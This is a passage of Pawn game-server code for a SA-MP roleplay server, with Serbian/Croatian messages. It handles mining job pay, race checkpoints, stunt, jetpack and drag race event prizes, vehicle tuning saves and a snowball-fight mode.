					    mysql_tquery( mSQL, q );

					}
					else if( GetFactionType( playerid ) == ORG_TIP_BANDA )
					{
					    new droga = random(20)+20;
					    if( PlayerInfo[playerid][xTorba_Droga]+droga < 100000 )
						{
						    PlayerInfo[playerid][xTorba_Droga] += droga;

							SCMF( playerid, 0x95B4A2FF, "(SVERC): Otvorili ste kutiju i dobili {FFFFFF}(%d) {95B4A2}droge.", droga );

							new q[ 128 ];
							mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xTorba_Droga` = '%d', `mats_smugl` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xTorba_Droga], PlayerInfo[ playerid ][ xSvercer ], PlayerInfo[ playerid ][ xID ] );
						    mysql_tquery( mSQL, q );
						}
						else SendErrorMessage( playerid, "Nemate mesta gde da stavite drogu(propala vam je)." );
					}

					ApplyAnimation( playerid, "CARRY", "putdwn", 3.0, 0, 0, 0, 0, 0 );
	            }
			}
		}
	}
	return 1;
}

//------------------------------------------------------------------------------

_:public Iskopavanje( playerid )
{
	if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ])
	{
		KillTimer(rudarPosao[ playerid ][ rudarTimer ]);
		ClearAnimations( playerid );
		CheckpointStatus[ playerid ] = 0;
  		SMG_TogglePlayerControllable( playerid, true );

		new zarada;
		if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
		else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

		new zlato = zarada + random(3*jskInfo[playerid][skill_Rudar]);

		if(jskInfo[playerid][skill_Rudar] == 20) 
		{
			PlayerInfo[ playerid ][ xZlato ] += zlato;
			SendJobMessage( playerid, "Iskopali ste {FFFFFF}(%dg) {36AB00}zlata.", zlato );
		}
		else 
		{
			PlayerInfo[ playerid ][ xZlato ] += zlato;
			SendJobMessage( playerid, "Iskopali ste {FFFFFF}(%dg) {36AB00}zlata.", zlato );

			jskInfo[playerid][skill_Rudar]++;
			sql_updatejobskills(playerid);
		}
		BussinesJobMoney(POSAO_RUDAR, ((zlato*150)/10));
		sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
		PosaoRudar[ playerid ] = 0;
		ShowPlayerDialog(playerid, dialog_RUDAR, DIALOG_STYLE_MSGBOX, "{FFFFFF}Posao - Rudar:", "{FFFFFF}* Da li zelite da nastavite sa kopanjem?", "Da", "Ne");
	}
	return 1;
}

//------------------------------------------------------------------------------

public OnPlayerEnterRaceCheckpoint( playerid )
{
	if( TrkaCheckpoint[ playerid ] != 0 )
	{
	    switch( TrkaCheckpoint[ playerid ] )
		{
	        case 1:
			{
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
	            	TrkaCheckpoint[ playerid ] = 2;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1456.4524, -282.5754, 1050.6942, -1396.2809, -190.8598, 1051.4340, 7.0 );
				}
	        }
	        case 2:
			{
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
	            	TrkaCheckpoint[ playerid ] = 3;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1396.2809, -190.8598, 1051.4340, -1302.6482, -147.4566, 1050.1260, 7.0 );
				}
	        }
	        case 3:
			{
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
	            	TrkaCheckpoint[ playerid ] = 4;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1302.6482, -147.4566, 1050.1260, -1297.8522, -263.9526, 1048.8831, 7.0 );
				}
	        }
	        case 4:
			{
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
	            	TrkaCheckpoint[ playerid ] = 5;
	            	SetPlayerRaceCheckpoint( playerid, 0, -1297.8522, -263.9526, 1048.8831, -1389.8533, -254.1669, 1043.3276, 7.0 );
				}
			}
			case 5:
			{
	            if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
	            	TrkaCheckpoint[ playerid ] = 6;
	            	SetPlayerRaceCheckpoint( playerid, 1, -1389.8533, -254.1669, 1043.3276, -1431.3984, -129.8569, 1045.4110, 7.0 );
				}
			}
	        case 6:
			{
				if( IsPlayerInVehicle( playerid, TrkaVozilo[ playerid ] ) && NaUtrci[ playerid ] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
				{
                    SetPlayerRaceCheckpoint( playerid, 0, -1431.3984, -129.8569, 1045.4110, -1456.4524, -282.5754, 1050.6942, 7.0 );
					TrkaCheckpoint[ playerid ] = 1;

					Krugovi[ playerid ]++;
				    SCMF( playerid, 0x83BFBFAA, "(NEED FOR SPEED): Krug {FFFFFF}(%d/5).", Krugovi[ playerid ]);

					if( Krugovi[ playerid ] == 5 )
					{
				        new izazivac = PonudioIgrac[ playerid ];

                        DisablePlayerRaceCheckpoint( playerid );
				        NaUtrci[ playerid ] = false; Krugovi[ playerid ] = 0; TrkaIzazov[ playerid ] = 0; StaroVreme[ playerid ] = 0;
					    SMG_DestroyVehicle( TrkaVozilo[ playerid ] ); TrkaVozilo[ playerid ] = -1;
						SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
                        UcitajObjekte( playerid );
						SetCameraBehindPlayer( playerid );
						SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
						SetPlayerInterior( playerid, PlayerPosInt[ playerid ] ); TrkaCheckpoint[ playerid ] = 0;
						DajIgracuNovac( playerid, ( UlogTrke[ playerid ]*2 ) );
						SendInfoMessage( playerid, "Pobedili ste na trci i osvojili {FFFFFF}($%d).", ( UlogTrke[ playerid ]*2 ) );

					    if(questInfo[playerid][qt_EasyQuest][9] == false)
					    {
					    	questInfo[playerid][qt_EasyQuest][9] = true;
					    	sql_UpdateQuest(playerid);

							KillTimer(QuestTimer[playerid]);
							quest_CreateTDs(playerid, false);

							quest_CreateTDs(playerid, true);
							PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.10");
							PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");
								
							QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
					    }

				        if( izazivac != IPI )
						{
				            DisablePlayerRaceCheckpoint( izazivac );
				            SendInfoMessage( izazivac, "Izgubili ste na trci i izgubili $%d.", UlogTrke[ playerid ] );
							NaUtrci[ izazivac ] = false;
							Krugovi[ izazivac ] = 0;
							TrkaIzazov[ izazivac ] = 0;
							StaroVreme[ izazivac ] = 0;
							SMG_DestroyVehicle( TrkaVozilo[ izazivac ] ); TrkaVozilo[ izazivac ] = -1;
				            SMG_SetPlayerPos( izazivac, PlayerPos[ izazivac ][ 0 ], PlayerPos[ izazivac ][ 1 ],  PlayerPos[ izazivac ][ 2 ] );
                            UcitajObjekte( izazivac );
							SetCameraBehindPlayer( izazivac );
							SetPlayerVirtualWorld( izazivac, PlayerPosVW[ izazivac ] );
							SetPlayerInterior( izazivac, PlayerPosInt[ izazivac ] ); TrkaCheckpoint[ izazivac ] = 0;
						}
					}
				}
			}
		}
	}

	//

	if(EventInfo[Started] == event_STUNT)
	{
		if(PlayerInvited[playerid] == event_STUNT)
		{
			switch(PlayerCP[playerid])
			{
				case 0 .. 23:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 0, 
														StuntRace_CP[PlayerCP[playerid]][0], StuntRace_CP[PlayerCP[playerid]][1], StuntRace_CP[PlayerCP[playerid]][2], 
														StuntRace_CP[PlayerCP[playerid] + 1][0], StuntRace_CP[PlayerCP[playerid] + 1][1], StuntRace_CP[PlayerCP[playerid] + 1][2], 5.0);
					
				}
				case 24:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 1, 
														StuntRace_CP[PlayerCP[playerid]][0], StuntRace_CP[PlayerCP[playerid]][1], StuntRace_CP[PlayerCP[playerid]][2], 
														StuntRace_CP[PlayerCP[playerid]][0], StuntRace_CP[PlayerCP[playerid]][1], StuntRace_CP[PlayerCP[playerid]][2], 5.0);
					
				}
				case 25:
				{
					switch(EventInfo[ Position ])
					{
						case 0:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent1Mesto ]++;
							sql_user_update_integer( playerid, "event_first_place", PlayerInfo[ playerid ][ xEvent1Mesto ] );
							DajIgracuNovac( playerid, 10000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - STUNT RACE): Prvo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$10.000", ImeIgraca( playerid ) );

							SetPlayerVirtualWorld( playerid, 0 );
							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;
						}
						case 1:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent2Mesto ]++;
							sql_user_update_integer( playerid, "event_second_place", PlayerInfo[ playerid ][ xEvent2Mesto ] );
							DajIgracuNovac( playerid, 7500 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - STUNT RACE): Drugo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$7.500", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;

							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}
						}
						case 2:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent3Mesto ]++;
							sql_user_update_integer( playerid, "event_third_place", PlayerInfo[ playerid ][ xEvent3Mesto ] );
							DajIgracuNovac( playerid, 5000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - STUNT RACE): Trece mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$5.000", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ] = 0;
		    				EventInfo[ Started ] = 0;

							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}

							foreach( new i : Player)
							{
								if( PlayerInvited[ i ] == event_STUNT )
								{
									PlayerCP[i] = 0;
									PlayerInvited[i] = 0;
									SMG_TogglePlayerControllable( i, true );
									SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
									DisablePlayerRaceCheckpoint( i );
									SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
									SetPlayerInterior( i, PlayerPosInt[ i ] );

									if(EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] != -1)
									{
										VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
									    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
										SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
										PlayerEventVehID[ i ] = -1;
									}
								}
							}
						}
					}
				}
			}
		}
	}
	else if(EventInfo[Started] == event_JETPACK)
	{
		if(PlayerInvited[playerid] == event_JETPACK)
		{
			switch(PlayerCP[playerid])
			{
				case 0 .. 24:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 3, 
														JetpackRace_CP[PlayerCP[playerid]][0], JetpackRace_CP[PlayerCP[playerid]][1], JetpackRace_CP[PlayerCP[playerid]][2], 
														JetpackRace_CP[PlayerCP[playerid] + 1][0], JetpackRace_CP[PlayerCP[playerid] + 1][1], JetpackRace_CP[PlayerCP[playerid] + 1][2], 5.0);
					
				}
				case 25:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 4, 
														JetpackRace_CP[PlayerCP[playerid]][0], JetpackRace_CP[PlayerCP[playerid]][1], JetpackRace_CP[PlayerCP[playerid]][2], 
														JetpackRace_CP[PlayerCP[playerid]][0], JetpackRace_CP[PlayerCP[playerid]][1], JetpackRace_CP[PlayerCP[playerid]][2], 5.0);
					
				}
				case 26:
				{
					switch(EventInfo[ Position ])
					{
						case 0:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent1Mesto ]++;
							sql_user_update_integer( playerid, "event_first_place", PlayerInfo[ playerid ][ xEvent1Mesto ] );
							DajIgracuNovac( playerid, 10000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - JETPACK RACE): Prvo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$10.000", ImeIgraca( playerid ) );

							SetPlayerVirtualWorld( playerid, 0 );
							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;
						}
						case 1:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent2Mesto ]++;
							sql_user_update_integer( playerid, "event_second_place", PlayerInfo[ playerid ][ xEvent2Mesto ] );
							DajIgracuNovac( playerid, 7500 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - JETPACK RACE): Drugo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$7.500", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;
						}
						case 2:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent3Mesto ]++;
							sql_user_update_integer( playerid, "event_third_place", PlayerInfo[ playerid ][ xEvent3Mesto ] );
							DajIgracuNovac( playerid, 5000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - JETPACK RACE): Trece mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$5.000", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ] = 0;
		    				EventInfo[ Started ] = 0;

							foreach( new i : Player)
							{
								if( PlayerInvited[ i ] == event_JETPACK )
								{
									PlayerCP[i] = 0;
									PlayerInvited[i] = 0;
									SMG_TogglePlayerControllable( i, true );
									DisablePlayerRaceCheckpoint( i );
									SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
									SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
									SetPlayerInterior( i, PlayerPosInt[ i ] );
								}
							}
						}
					}
				}
			}
		}
	}
	else if(EventInfo[Started] == event_DRAG)
	{
		if(PlayerInvited[playerid] == event_DRAG)
		{
			switch(PlayerCP[playerid])
			{
				case 0 .. 19:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 0, 
														DragRace_CP[PlayerCP[playerid]][0], DragRace_CP[PlayerCP[playerid]][1], DragRace_CP[PlayerCP[playerid]][2], 
														DragRace_CP[PlayerCP[playerid] + 1][0], DragRace_CP[PlayerCP[playerid] + 1][1], DragRace_CP[PlayerCP[playerid] + 1][2], 5.0);
					
				}
				case 20:
				{
					PlayerCP[playerid]++;
					SetPlayerRaceCheckpoint(playerid, 1, 
														DragRace_CP[PlayerCP[playerid]][0], DragRace_CP[PlayerCP[playerid]][1], DragRace_CP[PlayerCP[playerid]][2], 
														DragRace_CP[PlayerCP[playerid]][0], DragRace_CP[PlayerCP[playerid]][1], DragRace_CP[PlayerCP[playerid]][2], 5.0);
					
				}
				case 21:
				{
					switch(EventInfo[ Position ])
					{
						case 0:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent1Mesto ]++;
							sql_user_update_integer( playerid, "event_first_place", PlayerInfo[ playerid ][ xEvent1Mesto ] );
							DajIgracuNovac( playerid, 10000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - DRAG RACE): Prvo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$10.000", ImeIgraca( playerid ) );

							SetPlayerVirtualWorld( playerid, 0 );
							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;

							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}
							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}
						    if(questInfo[playerid][qt_EasyQuest][9] == false)
						    {
						    	questInfo[playerid][qt_EasyQuest][9] = true;
						    	sql_UpdateQuest(playerid);

								KillTimer(QuestTimer[playerid]);
								quest_CreateTDs(playerid, false);

								quest_CreateTDs(playerid, true);
								PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.10");
								PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");
								
								QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
						    }
						}
						case 1:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent2Mesto ]++;
							sql_user_update_integer( playerid, "event_second_place", PlayerInfo[ playerid ][ xEvent2Mesto ] );
							DajIgracuNovac( playerid, 7500 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - DRAG RACE): Drugo mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$7.500", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ]--;

							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}
						}
						case 2:
						{
							PlayerCP[playerid] = 0;
							PlayerInvited[playerid] = 0;
							PlayerInfo[ playerid ][ xEvent3Mesto ]++;
							sql_user_update_integer( playerid, "event_third_place", PlayerInfo[ playerid ][ xEvent3Mesto ] );
							DajIgracuNovac( playerid, 5000 );

							SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - DRAG RACE): Trece mjesto na eventu osvaja {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$5.000", ImeIgraca( playerid ) );

							SMG_TogglePlayerControllable( playerid, true );
							DisablePlayerRaceCheckpoint( playerid );
							SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
							SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
							SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
							EventInfo[ Position ]++;
							EventInfo[ Drivers ] = 0;
		    				EventInfo[ Started ] = 0;

							if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
							{
								VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
							    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
								PlayerEventVehID[ playerid ] = -1;
							}

							foreach( new i : Player)
							{
								if( PlayerInvited[ i ] == event_DRAG )
								{
									PlayerCP[i] = 0;
									PlayerInvited[i] = 0;
									SMG_TogglePlayerControllable( i, true );
									SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
									DisablePlayerRaceCheckpoint( i );
									SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
									SetPlayerInterior( i, PlayerPosInt[ i ] );

									if(EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] != -1)
									{
										VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
									    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
										SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ i ] ] );
										PlayerEventVehID[ i ] = -1;
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return 1;
}

public OnPlayerRequestSpawn( playerid )
{
    if( PlayerLogged[ playerid ] == true )
	{
		//PostaviSpawn( playerid );
		SMG_SetSpawnInfo( playerid );
    	SpawnPlayer( playerid );
	}
    else return(false);
	return 1;
}

public OnEnterExitModShop( playerid, enterexit, interiorid )
{
    return 1;
}

public OnVehicleMod( playerid, vehicleid, componentid )
{
	if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
	{
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
	 	{
			SavePlayerVehicleTuning( vehicleid, componentid );
			VehicleInfo[ vehicleid ][ vTuned ] = 1;

			if( !IsComponentidCompatible( GetVehicleModel( vehicleid ), componentid ) ) RemoveVehicleComponent( vehicleid, componentid);
		}
	}
	return 1;
}

public OnVehiclePaintjob( playerid, vehicleid, paintjobid)
{
	if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
	{
	    if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
		{
			VehicleInfo[ vehicleid ][ vPaintJob ] = paintjobid;
			VehicleInfo[ vehicleid ][ vTuned ] = 1;

            new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_tuned` = '%d', `v_paintjob` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
								VehicleInfo[ vehicleid ][ vTuned ],
								VehicleInfo[ vehicleid ][ vPaintJob ],
								VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );
		}
	}
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
    /*new colorStr[24] ;
    format(colorStr, sizeof(colorStr), "%d-%d", color1, color2);
    setproperty(_, "", PROPERTY_OFFSET(vehicleid), colorStr);

	if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO ) 
	{
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 ) 
		{
			VehicleInfo[ vehicleid ][ vColor1 ] = color1;
			VehicleInfo[ vehicleid ][ vColor2 ] = color2;

			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_color_1` = '%d', `v_color_2` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
									VehicleInfo[ vehicleid ][ vColor1 ],
									VehicleInfo[ vehicleid ][ vColor2 ],
									VehicleInfo[ vehicleid ][ vSqlID ] );

			mysql_tquery( mSQL, q );
		}
	}*/
	return 1;
}

//------------------------------------------------------------------------------

_:public CheckSnow( playerid )
{
	#if ZIMSKI_MOD == 1
	Shoot[ playerid ] = 0;
	for( new i = 0; i < 30; i++ )
	{
		new Float:X, Float:Y;
		GetXYInFrontOfPlayer( playerid, X, Y, i );

	    foreach(new z : Player)
		{
			if( z != playerid && Shoot[ playerid ] == 0 && AlreadyShooted[ z ] == false && IsPlayerInDynamicArea(z, Area_Grudvanje) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT )
			{
				if( IsPlayerInRangeOfPoint( z, 1.0, X, Y, 13.7969 ) )
				{
					Shoot[ playerid ] = 0;

					new Float:pX, Float:pY, Float:pZ, Float:tX, Float:tY, Float:tZ;
					GetPlayerPos( playerid, pX, pY, pZ );
					GetPlayerPos( z, tX, tY, tZ );
					Obj[ z ] = CreateDynamicObject( 2709, pX, pY, pZ+0.5, 0.0, 0.0, 0.0, 30);
					MoveDynamicObject( Obj[ z ], tX, tY, tZ-0.9, 25.0 );

					AlreadyShooted[ z ] = true;
					SetPlayerTimerEx(playerid, "SkiniSnegGrudavnje", 2000, false, "i", z);
 
					foreach(new g : Player)
					{
						if(Snow_F[g])
						{
				    		SCMF(g, 0x6EF83CFF, "(GRUDVANJE): {FFFFFF}%s {6EF83C}je pogodi%s {FFFFFF}%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( z ));
				    	}
				    }

					Charged[ playerid ] = 0;

				    ApplyAnimation( playerid, "GRENADE", "WEAPON_throw", 4.1, 0, 1, 1, 0, 1000, 1 );
				    ApplyAnimation( z, "PED", "KO_skid_front", 4.1, 0, 1, 1, 0, 2000, 1 );
				}
			}
		}
	}
	#endif
	return 1;
}

public OnPlayerKeyStateChange( playerid, newkeys, oldkeys )
{
